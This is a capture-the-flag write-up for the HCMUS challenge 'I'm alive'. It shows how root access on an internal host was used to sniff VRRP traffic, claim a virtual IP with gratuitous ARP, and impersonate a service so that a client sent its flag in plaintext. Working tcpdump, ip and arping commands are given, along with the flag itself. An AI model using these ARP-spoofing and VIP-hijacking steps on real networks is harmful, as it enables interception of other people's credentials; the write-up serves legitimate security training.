# I'm alive

- Category: `pwn / network MITM`
- Solves / Points: `10 solves / 154 points`
- Access given: root SSH on a compromised host inside the target network

## Summary

The challenge gives shell access to one internal machine and asks us to intercept credentials sent between internal hosts.  
The intended weakness is that the internal network relies on a VRRP virtual IP and blindly trusts whoever currently owns that VIP on the LAN.

By sniffing VRRP advertisements, we can recover the VIP and see which subnet matters.  
By claiming that VIP locally with gratuitous ARP, we can make the client machine connect to us instead of the original service.  
Once that happens, the client sends the flag in plaintext over TCP.

## Vulnerability / Weakness

1. The host we control sits directly on the internal subnet `192.168.1.0/24`.
2. A service on that subnet uses VRRP to advertise the virtual address `192.168.1.10`.
3. Another internal host trusts the VIP and repeatedly connects to `192.168.1.10:8080`.
4. No authentication is done at the application layer before the secret is sent.
5. Because we already have root on a host in the same broadcast domain, we can:
   - add the VIP to our interface
   - send gratuitous ARP for that VIP
   - impersonate the service and receive the secret

In short: the internal network trusted layer-2 ownership of a VIP, and the client sent sensitive data to that VIP in cleartext.

## Recon

The challenge note says the internal services need around 3 to 4 minutes to boot, so waiting matters.

After SSHing in, the important network state is:

```text
eth0 = 192.168.1.13/24
eth1 = 10.0.2.15/24
```

The interesting subnet is `192.168.1.0/24`. A quick sweep shows:

```text
192.168.1.10 up
192.168.1.11 up
192.168.1.12 up
192.168.1.13 up
```

Listening services on the compromised box itself are not useful, but `tcpdump` is installed, which is the main clue.

### VRRP discovery

Sniffing `eth0` immediately reveals VRRP traffic:

```bash
tcpdump -i eth0 -nn -c 1 -vv proto 112
```

Representative output:

```text
192.168.1.11 > 224.0.0.18: VRRPv2, Advertisement, vrid 36, prio 18, authtype simple, intvl 1s, length 20, addrs: 192.168.1.10 auth "0xhcmus"
```

This tells us:

- VRRP master advertiser: `192.168.1.11`
- VIP: `192.168.1.10`
- VRID: `36`
- VRRP simple auth string: `0xhcmus`

The important part is not the auth string itself, but that we now know which VIP the internal client will trust.

### Verifying traffic direction

After temporarily claiming the VIP with ARP, `tcpdump` shows that `192.168.1.12` starts connecting to:

```text
192.168.1.10:8080
```

At that point we know the attack path:

1. become `192.168.1.10`
2. listen on port `8080`
3. wait for `.12` to talk to us

## Exploit

### Step 1: claim the VIP

Add the virtual IP to `eth0`:

```bash
ip addr add 192.168.1.10/24 dev eth0
```

### Step 2: poison ownership with gratuitous ARP

Continuously advertise that `192.168.1.10` is at our MAC:

```bash
while true; do
    arping -A -c 1 -I eth0 192.168.1.10
    sleep 1
done
```

### Step 3: impersonate the service

Bind a listener on `192.168.1.10:8080`.  
When the client at `192.168.1.12` reconnects, it sends the flag immediately as raw plaintext.

Observed payload:

```text
HCMUS-CTF{d0nt_trust_your_internal_netw0rk}
```

## Solver

I saved an automated solver in:

```text
im_alive/solve.py
```

What it does:

1. SSHes to the challenge box
2. Sniffs one VRRP packet to learn the VIP
3. Adds the VIP to `eth0`
4. Sends gratuitous ARP in a loop
5. Starts a fake HTTP listener on `VIP:8080`
6. Reads the incoming plaintext flag

## Command To Run

```bash
python3 im_alive/solve.py
```

Example output:

```text
[+] VRRP: vrid=36 priority=18 vip=192.168.1.10 auth=0xhcmus
[+] Flag: HCMUS-CTF{d0nt_trust_your_internal_netw0rk}
```

## Flag

`HCMUS-CTF{d0nt_trust_your_internal_netw0rk}`
